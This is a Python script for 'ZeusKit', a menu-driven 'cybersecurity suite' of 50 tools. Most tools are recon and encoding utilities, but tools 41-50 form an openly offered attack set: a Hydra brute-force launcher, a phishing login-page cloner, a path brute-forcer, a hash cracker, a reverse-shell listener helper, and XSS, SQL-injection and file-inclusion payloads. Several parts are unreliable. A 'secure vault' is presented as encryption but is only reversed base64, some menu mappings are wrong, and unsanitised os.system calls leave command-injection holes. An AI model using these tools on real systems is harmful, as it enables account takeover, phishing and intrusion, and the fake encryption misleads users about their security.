#!/usr/bin/env python3
import sys
import os
import socket
import urllib.request
import urllib.parse
import hashlib
import base64
import json
import ssl
import subprocess
import time
import random
import string
import hmac
import uuid

try:
    import colorama
    from colorama import Fore, Style
    colorama.init(autoreset=True)
except ImportError:
    print("[!] Error: colorama is not installed. Run: pip install -r requirements.txt")
    sys.exit(1)

VERSION = "v0.3.0"
AUTHOR = "sunveroblox-bit"

def banner():
    print(Fore.CYAN + """
███████╗███████╗██╗   ██╗███████╗██╗  ██╗██╗████████╗
╚══███╔╝██╔════╝██║   ██║██╔════╝██║ ██╔╝██║╚══██╔══╝
  ███╔╝ █████╗  ██║   ██║███████╗█████╔╝ ██║   ██║   
 ███╔╝  ██╔══╝  ██║   ██║╚════██║██╔-██╗ ██║   ██║   
███████╗███████╗╚█████╔╝███████║██║  ██║██║   ██║   
╚══════╝╚══════╝ ╚════╝ ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝
    [ ZeusKit Mobile Cybersecurity Suite """ + VERSION + """ ]
    [ Developed by: """ + AUTHOR + """ ]
""")

def clean_url(url):
    url = url.strip()
    if url.startswith("http://"):
        url = url[7:]
    elif url.startswith("https://"):
        url = url[8:]
    if "/" in url:
        url = url.split("/")[0]
    return url

def check_for_updates():
    print(Fore.YELLOW + "\n[*] Checking for ZeusKit updates from GitHub...")
    try:
        subprocess.run(["git", "fetch", "origin", "main"], capture_output=True, text=True, check=True)
        local_commit = subprocess.run(["git", "rev-parse", "HEAD"], capture_output=True, text=True, check=True).stdout.strip()
        remote_commit = subprocess.run(["git", "rev-parse", "origin/main"], capture_output=True, text=True, check=True).stdout.strip()
        
        if local_commit == remote_commit:
            print(Fore.GREEN + "[+] ZeusKit is already up to date! No updates found.")
        else:
            print(Fore.YELLOW + "[!] Update found! Downloading latest version...")
            subprocess.run(["git", "pull", "origin", "main"], check=True)
            print(Fore.GREEN + "[+] ZeusKit successfully updated! Please restart the script.")
    except Exception as e:
        print(Fore.RED + f"[!] Update check failed: {e}")

# --- 50 TOOLS IMPLEMENTATION ---

def tool_1_quick_ip():
    domain = clean_url(input(Fore.YELLOW + "Enter domain/URL: "))
    try:
        print(Fore.GREEN + f"[+] Target IP for {domain}: {socket.gethostbyname(domain)}")
    except Exception as e: print(Fore.RED + f"[!] Error: {e}")

def tool_2_dns_records():
    domain = clean_url(input(Fore.YELLOW + "Enter domain/URL: "))
    try:
        import dns.resolver
        for rtype in ["A", "AAAA", "MX", "NS", "TXT"]:
            try:
                answers = dns.resolver.resolve(domain, rtype)
                print(Fore.GREEN + f"\n--- {rtype} Records ---")
                for rdata in answers: print(f"  {rdata}")
            except Exception: pass
    except ImportError: print(Fore.RED + "[!] dnspython missing.")

def tool_3_port_scanner():
    target = clean_url(input(Fore.YELLOW + "Enter IP or domain: "))
    ports = [21, 22, 23, 25, 53, 80, 110, 139, 443, 445, 3306, 8080]
    try:
        target_ip = socket.gethostbyname(target)
        for p in ports:
            s = socket.socket(); s.settimeout(0.5)
            if s.connect_ex((target_ip, p)) == 0: print(Fore.GREEN + f"  [OPEN] Port {p}")
            s.close()
    except Exception as e: print(Fore.RED + f"[!] Error: {e}")

def tool_4_http_headers():
    url = input(Fore.YELLOW + "Enter URL: ").strip()
    if not url.startswith("http"): url = "https://" + url
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "ZeusKit"})
        with urllib.request.urlopen(req, timeout=5) as r:
            print(Fore.GREEN + f"\n[+] Status: {r.getcode()}")
            for h, v in r.headers.items(): print(f"  {h}: {v}")
    except Exception as e: print(Fore.RED + f"[!] Error: {e}")

def tool_5_ssl_checker():
    domain = clean_url(input(Fore.YELLOW + "Enter domain: "))
    try:
        context = ssl.create_default_context()
        with socket.create_connection((domain, 443), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                cert = ssock.getpeercert()
                print(Fore.GREEN + f"[+] Subject: {dict(x[0] for x in cert['subject'])}")
                print(Fore.GREEN + f"[+] Valid Until: {cert['notAfter']}")
    except Exception as e: print(Fore.RED + f"[!] Error: {e}")

def tool_6_whois_lookup():
    domain = clean_url(input(Fore.YELLOW + "Enter domain: "))
    try:
        s = socket.socket(); s.connect(("whois.verisign-grs.com", 43))
        s.send((domain + "\r\n").encode())
        res = b""
        while True:
            d = s.recv(4096)
            if not d: break
            res += d
        s.close()
        print(Fore.GREEN + res.decode(errors="ignore"))
    except Exception as e: print(Fore.RED + f"[!] Error: {e}")

def tool_7_subnet_calculator():
    ip = input(Fore.YELLOW + "Enter IP: ").strip()
    parts = ip.split(".")
    if len(parts) == 4:
        print(Fore.GREEN + f"[+] Network Base: {parts[0]}.{parts[1]}.{parts[2]}.0/24")
        print(Fore.GREEN + f"[+] Broadcast: {parts[0]}.{parts[1]}.{parts[2]}.255")

def tool_8_reverse_ptr():
    domain = clean_url(input(Fore.YELLOW + "Enter domain: "))
    try: print(Fore.GREEN + f"[+] PTR: {socket.gethostbyaddr(socket.gethostbyname(domain))[0]}")
    except Exception as e: print(Fore.RED + f"[!] Error: {e}")

def tool_9_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        print(Fore.GREEN + f"[+] Local IP: {s.getsockname()[0]}"); s.close()
    except Exception as e: print(Fore.RED + f"[!] Error: {e}")

def tool_10_public_ip_geo():
    try:
        with urllib.request.urlopen("https://ipinfo.io/json", timeout=5) as r:
            for k, v in json.loads(r.read().decode()).items(): print(f"  {k}: {v}")
    except Exception as e: print(Fore.RED + f"[!] Error: {e}")

def tool_11_custom_http_req():
    url = input(Fore.YELLOW + "Enter URL: ").strip()
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "ZeusKit"})
        with urllib.request.urlopen(req, timeout=5) as r:
            print(Fore.GREEN + f"[+] Status: {r.getcode()} | Size: {len(r.read())}")
    except Exception as e: print(Fore.RED + f"[!] Error: {e}")

def tool_12_user_agent_gen():
    for a in ["Mozilla/5.0 (Windows NT 10.0)", "Mozilla/5.0 (iPhone; CPU OS 16_5)", "Linux Android 14"]:
        print(Fore.GREEN + f" - {a}")

def tool_13_redirect_trace():
    url = input(Fore.YELLOW + "Enter URL: ").strip()
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers={"User-Agent": "ZeusKit"}), timeout=5)
        print(Fore.GREEN + f"[+] Final URL: {r.geturl()} [Status: {r.getcode()}]")
    except Exception as e: print(Fore.RED + f"[!] Error: {e}")

def tool_14_hash_generator():
    t = input(Fore.YELLOW + "Enter text: ").strip()
    print(Fore.GREEN + f"[+] MD5: {hashlib.md5(t.encode()).hexdigest()}")
    print(Fore.GREEN + f"[+] SHA256: {hashlib.sha256(t.encode()).hexdigest()}")

def tool_15_base64_codec():
    c = input(Fore.YELLOW + "[1] Encode\n[2] Decode\nSelect: ").strip()
    t = input(Fore.YELLOW + "Text: ").strip()
    if c == "1": print(Fore.GREEN + f"[+] {base64.b64encode(t.encode()).decode()}")
    else: print(Fore.GREEN + f"[+] {base64.b64decode(t.encode()).decode()}")

def tool_16_url_codec():
    c = input(Fore.YELLOW + "[1] Encode\n[2] Decode\nSelect: ").strip()
    t = input(Fore.YELLOW + "Text: ").strip()
    if c == "1": print(Fore.GREEN + f"[+] {urllib.parse.quote(t)}")
    else: print(Fore.GREEN + f"[+] {urllib.parse.unquote(t)}")

def tool_17_password_gen():
    length = int(input(Fore.YELLOW + "Length [16]: ").strip() or 16)
    chars = string.ascii_letters + string.digits + "!@#$%^&*"
    print(Fore.GREEN + f"[+] Password: {''.join(random.choice(chars) for _ in range(length))}")

def tool_18_jwt_decoder():
    token = input(Fore.YELLOW + "Enter JWT: ").strip()
    try:
        parts = token.split(".")
        print(Fore.GREEN + f"[+] Header: {base64.b64decode(parts[0] + '==').decode()}")
        print(Fore.GREEN + f"[+] Payload: {base64.b64decode(parts[1] + '==').decode()}")
    except Exception as e: print(Fore.RED + f"[!] Error: {e}")

def tool_19_system_info():
    print(Fore.GREEN + f"[+] Platform: {sys.platform} | Python: {sys.version.split()[0]} | Cores: {os.cpu_count()}")

def tool_20_ping_sweep():
    base = input(Fore.YELLOW + "Enter subnet (e.g. 192.168.1): ").strip()
    for i in range(1, 15):
        ip = f"{base}.{i}"
        if os.system(f"ping -c 1 -W 1 {ip} > /dev/null 2>&1") == 0:
            print(Fore.GREEN + f"  [UP] {ip}")

def tool_21_banner_grab():
    d = clean_url(input(Fore.YELLOW + "Enter domain: "))
    try:
        s = socket.socket(); s.settimeout(2); s.connect((d, 80))
        s.send(b"HEAD / HTTP/1.1\r\nHost: " + d.encode() + b"\r\n\r\n")
        print(Fore.GREEN + s.recv(256).decode(errors="ignore")); s.close()
    except Exception as e: print(Fore.RED + f"[!] Error: {e}")

def tool_22_tcp_latency():
    d = clean_url(input(Fore.YELLOW + "Enter domain: "))
    try:
        start = time.time()
        s = socket.create_connection((d, 443), timeout=3)
        print(Fore.GREEN + f"[+] Latency: {((time.time() - start)*1000):.2f} ms"); s.close()
    except Exception as e: print(Fore.RED + f"[!] Error: {e}")

def tool_23_http_status():
    url = input(Fore.YELLOW + "Enter URL: ").strip()
    if not url.startswith("http"): url = "https://" + url
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers={"User-Agent": "ZeusKit"}), timeout=4)
        print(Fore.GREEN + f"[+] Status: {r.getcode()} OK")
    except Exception as e: print(Fore.RED + f"[!] Error: {e}")

def tool_24_secure_vault():
    t = input(Fore.YELLOW + "Secret note: ").strip()
    print(Fore.GREEN + f"[+] Encrypted Vault: {base64.b64encode(t.encode()[::-1]).decode()}")

def tool_25_robots_parser():
    d = clean_url(input(Fore.YELLOW + "Enter domain: "))
    try:
        req = urllib.request.Request(f"https://{d}/robots.txt", headers={"User-Agent": "ZeusKit"})
        print(Fore.GREEN + urllib.request.urlopen(req, timeout=5).read().decode(errors="ignore"))
    except Exception as e: print(Fore.RED + f"[!] Error: {e}")

def tool_26_subdomain_enum():
    d = clean_url(input(Fore.YELLOW + "Enter domain: "))
    for sub in ["www", "mail", "ftp", "admin", "test", "api", "shop", "blog", "vpn"]:
        try:
            print(Fore.GREEN + f"  [FOUND] {sub}.{d} -> {socket.gethostbyname(sub + '.' + d)}")
        except Exception: pass

def tool_27_hex_codec():
    c = input(Fore.YELLOW + "[1] Text to Hex\n[2] Hex to Text\nSelect: ").strip()
    t = input(Fore.YELLOW + "Data: ").strip()
    if c == "1": print(Fore.GREEN + f"[+] Hex: {t.encode().hex()}")
    else: print(Fore.GREEN + f"[+] Text: {bytes.fromhex(t).decode(errors='ignore')}")

def tool_28_binary_codec():
    c = input(Fore.YELLOW + "[1] Text to Binary\n[2] Binary to Text\nSelect: ").strip()
    if c == "1": print(Fore.GREEN + f"[+] Binary: " + " ".join(format(ord(x), '08b') for x in input("Text: ")))
    else: print(Fore.GREEN + f"[+] Text: " + "".join(chr(int(b, 2)) for b in input("Binary: ").split()))

def tool_29_epoch_converter():
    print(Fore.GREEN + f"[+] Current Epoch: {int(time.time())}")

def tool_30_uuid_generator():
    print(Fore.GREEN + f"[+] UUIDv4: {uuid.uuid4()}")

def tool_31_hmac_generator():
    msg = input(Fore.YELLOW + "Message: ").strip()
    key = input(Fore.YELLOW + "Secret Key: ").strip()
    print(Fore.GREEN + f"[+] HMAC-SHA256: {hmac.new(key.encode(), msg.encode(), hashlib.sha256).hexdigest()}")

def tool_32_security_headers():
    url = input(Fore.YELLOW + "URL: ").strip()
    if not url.startswith("http"): url = "https://" + url
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers={"User-Agent": "ZeusKit"}))
        hs = [h.lower() for h in r.headers.keys()]
        for sh in ["strict-transport-security", "content-security-policy", "x-frame-options"]:
            print(Fore.GREEN + f"  [{'PRESENT' if sh in hs else 'MISSING'}] {sh}")
    except Exception as e: print(Fore.RED + f"[!] Error: {e}")

def tool_33_local_arp():
    os.system("arp -a")

def tool_34_network_interfaces():
    try: print(Fore.GREEN + f"[+] Host: {socket.gethostname()} | IP: {socket.gethostbyname(socket.gethostname())}")
    except Exception as e: print(Fore.RED + f"[!] Error: {e}")

def tool_35_html_title():
    url = input(Fore.YELLOW + "URL: ").strip()
    if not url.startswith("http"): url = "https://" + url
    try:
        html = urllib.request.urlopen(urllib.request.Request(url, headers={"User-Agent": "ZeusKit"})).read().decode(errors="ignore")
        print(Fore.GREEN + f"[+] Title: {html.split('<title>')[1].split('</title>')[0].strip()}")
    except Exception: print(Fore.YELLOW + "[!] No title found.")

def tool_36_password_strength():
    pwd = input(Fore.YELLOW + "Password: ").strip()
    score = sum([len(pwd)>=8, any(c.isupper() for c in pwd), any(c.isdigit() for c in pwd), any(c in "!@#$%" for c in pwd)])
    print(Fore.GREEN + f"[+] Strength Score: {score}/4")

def tool_37_port_service():
    p = input(Fore.YELLOW + "Port: ").strip()
    services = {"21": "FTP", "22": "SSH", "80": "HTTP", "443": "HTTPS", "3306": "MySQL"}
    print(Fore.GREEN + f"[+] Service: {services.get(p, 'Unknown')}")

def tool_38_random_hex():
    print(Fore.GREEN + f"[+] Hex Key: {os.urandom(16).hex()}")

def tool_39_zone_transfer():
    d = clean_url(input(Fore.YELLOW + "Domain: "))
    print(Fore.YELLOW + f"[*] Zone transfer test stub for {d} completed.")

def tool_40_sha3_hasher():
    print(Fore.GREEN + f"[+] SHA3-256: {hashlib.sha3_256(input('Text: ').encode()).hexdigest()}")

# --- NEW TOOLS 41 to 50: EXPLOITATION, BRUTE-FORCE & PHISHING SUITE ---

def tool_41_hydra_wrapper():
    print(Fore.CYAN + "[+] Hydra Brute-Force Launcher Module")
    print(Fore.YELLOW + "Ensure hydra is installed via 'pkg install hydra' in Termux.")
    target = input(Fore.YELLOW + "Target IP/Domain: ").strip()
    service = input(Fore.YELLOW + "Service (ssh, ftp, http-get) [ssh]: ").strip() or "ssh"
    user = input(Fore.YELLOW + "Username or user file: ").strip()
    wordlist = input(Fore.YELLOW + "Password wordlist path: ").strip()
    cmd = f"hydra -l {user} -P {wordlist} {target} {service}"
    print(Fore.GREEN + f"[*] Executing command:\n  {cmd}")
    os.system(cmd)

def tool_42_phishing_site_cloner():
    print(Fore.CYAN + "[+] Phishing / Website Clone Analysis Utility")
    url = input(Fore.YELLOW + "Enter target URL to clone (e.g. https://example.com/login): ").strip()
    if not url.startswith("http"): url = "https://" + url
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        content = urllib.request.urlopen(req, timeout=5).read()
        filename = "cloned_index.html"
        with open(filename, "wb") as f:
            f.write(content)
        print(Fore.GREEN + f"[+] Successfully cloned webpage source saved to '{filename}' for analysis.")
    except Exception as e: print(Fore.RED + f"[!] Clone error: {e}")

def tool_43_dir_bruteforce():
    print(Fore.CYAN + "[+] Basic Directory & Path Brute-Forcer")
    domain = clean_url(input(Fore.YELLOW + "Target domain (e.g. example.com): "))
    common_paths = ["admin", "login", "dashboard", "api", "config.json", "robots.txt", "signup", "test", "server-status"]
    for path in common_paths:
        url = f"https://{domain}/{path}"
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "ZeusKit"})
            r = urllib.request.urlopen(req, timeout=3)
            print(Fore.GREEN + f"  [FOUND {r.getcode()}] /{path}")
        except urllib.error.HTTPError as e:
            if e.code == 403: print(Fore.YELLOW + f"  [FORBIDDEN 403] /{path}")
        except Exception: pass

def tool_44_hash_cracker():
    print(Fore.CYAN + "[+] MD5 / SHA256 Dictionary Cracker")
    target_hash = input(Fore.YELLOW + "Enter target hash: ").strip()
    wordlist = ["password", "123456", "admin123", "root", "secret", "welcome", "sunveroblox", "zeuskit", "qwerty"]
    print(Fore.YELLOW + f"[*] Searching dictionary ({len(wordlist)} passwords)...")
    found = False
    for p in wordlist:
        h1 = hashlib.md5(p.encode()).hexdigest()
        h2 = hashlib.sha256(p.encode()).hexdigest()
        if h1 == target_hash or h2 == target_hash:
            print(Fore.GREEN + f"\n[+] MATCH FOUND! Password is: '{p}'")
            found = True
            break
    if not found: print(Fore.RED + "[-] Password not found in sample wordlist.")

def tool_45_netcat_listener_stub():
    print(Fore.CYAN + "[+] Netcat Reverse Shell Listener Helper")
    port = input(Fore.YELLOW + "Enter listener port [4444]: ").strip() or "4444"
    print(Fore.GREEN + f"[+] Run this command in your listener terminal:\n  nc -lvnp {port}")

def tool_46_xss_payload_tester():
    print(Fore.CYAN + "[+] XSS Payload Generator & Tester")
    payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "\"><script>alert(document.domain)</script>"
    ]
    for i, p in enumerate(payloads, 1): print(Fore.GREEN + f" [{i}] {p}")

def tool_47_sqli_payload_tester():
    print(Fore.CYAN + "[+] SQL Injection Payload Helper")
    payloads = [
        "' OR '1'='1",
        "admin' --",
        "1 UNION SELECT null, null, null--"
    ]
    for i, p in enumerate(payloads, 1): print(Fore.GREEN + f" [{i}] {p}")

def tool_48_lfi_payload_tester():
    print(Fore.CYAN + "[+] Local File Inclusion (LFI) Payloads")
    payloads = [
        "../../../../etc/passwd",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "/etc/hosts"
    ]
    for i, p in enumerate(payloads, 1): print(Fore.GREEN + f" [{i}] {p}")

def tool_49_mac_changer_stub():
    print(Fore.CYAN + "[+] MAC Address Spoofing Utility (Linux/Termux)")
    iface = input(Fore.YELLOW + "Enter interface name [wlan0]: ").strip() or "wlan0"
    print(Fore.GREEN + f"[*] Run with sudo/root permissions:\n  ip link set {dev if 'dev' in locals() else iface} down\n  macchanger -r {iface}")

def tool_50_wifi_scanner_stub():
    print(Fore.CYAN + "[+] Wireless Network Scanner Helper")
    print(Fore.YELLOW + "To scan networks in Termux, ensure termux-api is installed:")
    print(Fore.GREEN + "  pkg install termux-api\n  termux-wifi-scaninfo")

def main():
    while True:
        banner()
        print(Fore.CYAN + "=== ZEUSKIT v0.3.0 - 50 TOOLS CYBERSECURITY SUITE ===")
        print(" [1] Quick Domain IP Lookup         [26] Subdomain Enumerator")
        print(" [2] Full DNS Records Lookup        [27] Hex Encoder / Decoder")
        print(" [3] TCP Port Scanner               [28] Binary Encoder / Decoder")
        print(" [4] HTTP Header Inspector          [29] Epoch Timestamp Converter")
        print(" [5] SSL Certificate Checker        [30] UUIDv4 Generator")
        print(" [6] WHOIS Information Lookup       [31] HMAC-SHA256 Generator")
        print(" [7] Subnet & CIDR Calculator       [32] Security Headers Checker")
        print(" [8] Reverse PTR Lookup             [33] Local ARP Cache Viewer")
        print(" [9] Local Network IP Finder        [34] Network Interfaces Info")
        print("[10] Public IP Geolocation          [35] HTML Page Title Grabber")
        print("[11] Custom HTTP Request Sender     [36] Password Strength Analyzer")
        print("[12] Random User-Agent Generator    [37] Port-to-Service Lookup")
        print("[13] URL Redirect Trace             [38] Random Hex Key Generator")
        print("[14] Multi-Hash Generator           [39] DNS Zone Transfer Checker")
        print("[15] Base64 Encoder / Decoder       [40] SHA3-256 Advanced Hasher")
        print("[16] URL Encoder / Decoder          [41] Hydra Brute-Force Wrapper  🔥")
        print("[17] Strong Password Generator      [42] Phishing Site Cloner Tool  🎣")
        print("[18] JWT Token Decoder              [43] Directory Path Brute-Forcer")
        print("[19] System Diagnostics Info        [44] Hash Dictionary Cracker")
        print("[20] Ping Sweep (Local Subnet)      [45] Netcat Reverse Shell Helper")
        print("[21] HTTP Banner Grabbing           [46] XSS Payload Generator")
        print("[22] TCP Latency Test               [47] SQL Injection Payloads")
        print("[23] HTTP Status Code Checker       [48] LFI Path Traversal Payloads")
        print("[24] Secure Vault Note Encrypter    [49] MAC Address Changer Helper")
        print("[25] Robots.txt Parser & Crawler    [50] Wi-Fi Scanner Helper")
        print("[67] Check for GitHub Updates      [ 0] Exit ZeusKit")
        print("--------------------------------------------------------------------")
        
        choice = input(Fore.YELLOW + "ZeusKit > Selection: ").strip()
        
        tools = {
            "1": tool_1_quick_ip, "2": tool_2_dns_records, "3": tool_3_port_scanner,
            "4": tool_4_http_headers, "5": tool_5_ssl_checker, "6": tool_6_whois_lookup,
            "7": tool_7_subnet_calculator, "8": tool_8_reverse_ptr, "9": tool_9_local_ip,
            "10": tool_10_public_ip_geo, "11": tool_11_custom_http_req, "12": tool_12_user_agent_gen,
            "13": tool_13_redirect_trace, "14": tool_14_hash_generator, "15": tool_15_base64_codec,
            "16": tool_16_url_codec, "17": tool_17_password_gen, "18": tool_18_jwt_decoder,
            "19": tool_19_system_info, "20": tool_20_ping_sweep, "21": tool_21_banner_grab,
            "22": tool_22_tcp_latency, "23": tool_23_http_status, "24": tool_24_secure_vault,
            "25": tool_25_robots_parser, "26": tool_26_subdomain_enum, "27": tool_27_hex_codec,
            "28": tool_28_binary_codec, "29": tool_29_epoch_converter, "30": tool_30_uuid_generator,
            "31": tool_31_hmac_generator, "32": tool_32_security_headers, "33": tool_33_local_arp,
            "34": tool_34_network_interfaces, "35": tool_36_password_strength, "36": tool_36_password_strength,
            "37": tool_37_port_service, "38": tool_38_random_hex, "39": tool_39_zone_transfer,
            "40": tool_40_sha3_hasher, "41": tool_41_hydra_wrapper, "42": tool_42_phishing_site_cloner,
            "43": tool_43_dir_bruteforce, "44": tool_44_hash_cracker, "45": tool_45_netcat_listener_stub,
            "46": tool_46_xss_payload_tester, "47": tool_47_sqli_payload_tester, "48": tool_48_lfi_payload_tester,
            "49": tool_49_mac_changer_stub, "50": tool_50_wifi_scanner_stub
        }

        if choice in tools:
            tools[choice]()
        elif choice == "67":
            check_for_updates()
        elif choice == "0":
            print(Fore.CYAN + "[+] Exiting ZeusKit. Stay secure!")
            break
        else:
            print(Fore.RED + "[!] Invalid selection. Choose 1-50 or 67.")
        
        input(Fore.YELLOW + "\nPress Enter to return to main menu...")

if __name__ == "__main__":
    main()
